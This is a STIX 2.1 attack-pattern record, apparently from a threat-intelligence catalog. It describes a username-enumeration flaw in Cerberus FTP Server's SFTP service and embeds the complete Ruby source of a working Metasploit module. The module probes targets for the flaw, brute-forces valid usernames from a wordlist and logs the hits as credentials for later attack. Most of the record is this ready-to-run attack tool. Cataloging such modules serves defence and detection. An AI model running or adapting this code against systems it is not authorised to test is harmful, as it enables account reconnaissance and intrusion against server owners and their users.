{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--02ce2c6e-4ccd-44fa-b5f9-3bb15c60d8ef",
    "created": "2024-08-14T16:27:29.881371Z",
    "modified": "2024-08-14T16:27:29.881376Z",
    "name": "Cerberus FTP Server SFTP Username Enumeration",
    "description": " This module uses a dictionary to brute force valid usernames from Cerberus FTP server via SFTP.  This issue affects all versions of the software older than 6.0.9.0 or 7.0.0.2 and is caused by a discrepancy in the way the SSH service handles failed logins for valid and invalid users.  This issue was discovered by Steve Embling. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/cerberus_sftp_enumusers.rb",
            "external_id": "cerberus_sftp_enumusers.rb"
        },
        {
            "source_name": "reference",
            "url": "http://xforce.iss.net/xforce/xfdb/93546"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Cerberus FTP Server SFTP Username Enumeration',\n      'Description' => %q{\n        This module uses a dictionary to brute force valid usernames from\n        Cerberus FTP server via SFTP.  This issue affects all versions of\n        the software older than 6.0.9.0 or 7.0.0.2 and is caused by a discrepancy\n        in the way the SSH service handles failed logins for valid and invalid\n        users.  This issue was discovered by Steve Embling.\n      },\n      'Author'      => [\n        'Steve Embling', # Discovery\n        'Matt Byrne <attackdebris[at]gmail.com>' # Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'URL',  'http://xforce.iss.net/xforce/xfdb/93546' ],\n          [ 'BID', '67707']\n        ],\n      'License'     => MSF_LICENSE,\n      'DisclosureDate' => '2014-05-27'\n    ))\n\n    register_options(\n      [\n        Opt::Proxies,\n        Opt::RPORT(22),\n        OptPath.new(\n          'USER_FILE',\n          [true, 'Files containing usernames, one per line', nil])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new(\n          'RETRY_NUM',\n          [true , 'The number of attempts to connect to a SSH server for each user', 3]),\n        OptInt.new(\n          'SSH_TIMEOUT',\n          [true, 'Specify the maximum time to negotiate a SSH session', 10]),\n        OptBool.new(\n          'SSH_DEBUG',\n          [true, 'Enable SSH debugging output (Extreme verbosity!)', false])\n      ]\n    )\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def retry_num\n    datastore['RETRY_NUM']\n  end\n\n  def check_vulnerable(ip)\n    opt_hash = {\n      :port            => rport,\n      :auth_methods    => ['password', 'keyboard-interactive'],\n      :use_agent       => false,\n      :config          => false,\n      :password_prompt => Net::SSH::Prompt.new,\n      :non_interactive => true,\n      :proxies         => datastore['Proxies'],\n      :verify_host_key => :never\n    }\n\n    begin\n      transport = Net::SSH::Transport::Session.new(ip, opt_hash)\n    rescue Rex::ConnectionError\n      return :connection_error\n    end\n\n    auth = Net::SSH::Authentication::Session.new(transport, opt_hash)\n    auth.authenticate(\"ssh-connection\", Rex::Text.rand_text_alphanumeric(8), Rex::Text.rand_text_alphanumeric(8))\n    auth_method = auth.allowed_auth_methods.join('|')\n    print_good \"#{peer(ip)} Server Version: #{auth.transport.server_version.version}\"\n    report_service(\n      host:  ip,\n      port:  rport,\n      name:  \"ssh\",\n      proto: \"tcp\",\n      info:  auth.transport.server_version.version\n    )\n\n    if auth_method.empty?\n      :vulnerable\n    else\n      :safe\n    end\n  end\n\n  def check_user(ip, user, port)\n    pass = Rex::Text.rand_text_alphanumeric(8)\n\n    opt_hash = {\n      :auth_methods    => ['password', 'keyboard-interactive'],\n      :port            => port,\n      :use_agent       => false,\n      :config          => false,\n      :proxies         => datastore['Proxies'],\n      :verify_host_key => :never\n    }\n\n    opt_hash.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n    transport = Net::SSH::Transport::Session.new(ip, opt_hash)\n    auth = Net::SSH::Authentication::Session.new(transport, opt_hash)\n\n    begin\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        auth.authenticate(\"ssh-connection\", user, pass)\n        auth_method = auth.allowed_auth_methods.join('|')\n        if auth_method != ''\n          :success\n        else\n          :fail\n        end\n      end\n    rescue Rex::ConnectionError\n      return :connection_error\n    rescue Net::SSH::Disconnect, ::EOFError\n      return :success\n    rescue ::Timeout::Error\n      return :connection_error\n    end\n  end\n\n  def do_report(ip, user, port)\n    service_data = {\n      address: ip,\n      port: rport,\n      service_name: 'ssh',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: user,\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def peer(rhost=nil)\n    \"#{rhost}:#{rport} SSH -\"\n  end\n\n  def user_list\n    users = nil\n    if File.readable? datastore['USER_FILE']\n      users = File.new(datastore['USER_FILE']).read.split\n      users.each {|u| u.downcase!}\n      users.uniq!\n    else\n      raise ArgumentError, \"Cannot read file #{datastore['USER_FILE']}\"\n    end\n\n    users\n  end\n\n  def attempt_user(user, ip)\n    attempt_num = 0\n    ret = nil\n\n    while (attempt_num <= retry_num) && (ret.nil? || ret == :connection_error)\n      if attempt_num > 0\n        Rex.sleep(2 ** attempt_num)\n        vprint_status(\"#{peer(ip)} Retrying '#{user}' due to connection error\")\n      end\n\n      ret = check_user(ip, user, rport)\n      attempt_num += 1\n    end\n\n    ret\n  end\n\n  def show_result(attempt_result, user, ip)\n    case attempt_result\n    when :success\n      print_good \"#{peer(ip)} User '#{user}' found\"\n      do_report(ip, user, rport)\n    when :connection_error\n      print_error \"#{peer(ip)} User '#{user}' could not connect\"\n    when :fail\n      vprint_status \"#{peer(ip)} User '#{user}' not found\"\n    end\n  end\n\n  def run_host(ip)\n    print_status \"#{peer(ip)} Checking for vulnerability\"\n    case check_vulnerable(ip)\n    when :vulnerable\n      print_good \"#{peer(ip)} Vulnerable\"\n      print_status \"#{peer(ip)} Starting scan\"\n      user_list.each do |user|\n        show_result(attempt_user(user, ip), user, ip)\n      end\n    when :safe\n      print_error \"#{peer(ip)} Not vulnerable\"\n    when :connection_error\n      print_error \"#{peer(ip)} Connection failed\"\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-05-27"
}